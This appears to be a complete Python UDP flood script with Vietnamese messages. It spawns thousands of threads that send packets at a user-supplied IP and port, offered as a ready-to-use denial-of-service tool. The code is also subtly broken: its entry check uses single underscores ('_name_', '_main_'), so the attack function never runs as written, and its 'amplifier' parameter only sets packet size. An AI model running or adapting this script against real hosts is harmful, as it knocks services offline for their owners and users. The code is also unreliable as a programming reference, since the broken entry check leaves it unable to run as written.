
import sys
import socket
import threading
import time

running = True

def send_packet(host, port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while running:
            try:
                s.sendto(b"\x99" * amplifier, (host, port))
                time.sleep(0.01)
            except Exception as e:
                print(f"Send error: {str(e)}")
                break
    finally:
        s.close()

def attack():
    global running
    
    if len(sys.argv) < 4:
        print("Cách dùng: python ddos.py <ip> <port> <method>")
        print("Các phương thức: UDP-Flood, UDP-Power, UDP-Mix")
        return

    host = sys.argv[1]
    port = int(sys.argv[2])
    method = sys.argv[3].upper()
    loops = 10000

    methods = {
        "UDP-FLOOD": [375],
        "UDP-POWER": [750],
        "UDP-MIX": [375, 750]
    }

    if method not in methods:
        print("Phương thức không hợp lệ!")
        return

    print(f"Bắt đầu tấn công {host}:{port} ({method})")
    print("Nhập '/stop' để dừng")

    threads = []
    for _ in range(loops):
        for amp in methods[method]:
            t = threading.Thread(
                target=send_packet,
                args=(host, port, amp),
                daemon=True
            )
            t.start()
            threads.append(t)
        time.sleep(0.1)

    def check_stop():
        global running
        while running:
            cmd = input().strip().lower()
            if cmd == '/stop':
                running = False
                break
    
    threading.Thread(target=check_stop, daemon=True).start()

    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
    
    print("Đang dừng tất cả kết nối...")
    time.sleep(2)
    print("Tấn công đã dừng")

if _name_ == "_main_":
    attack()
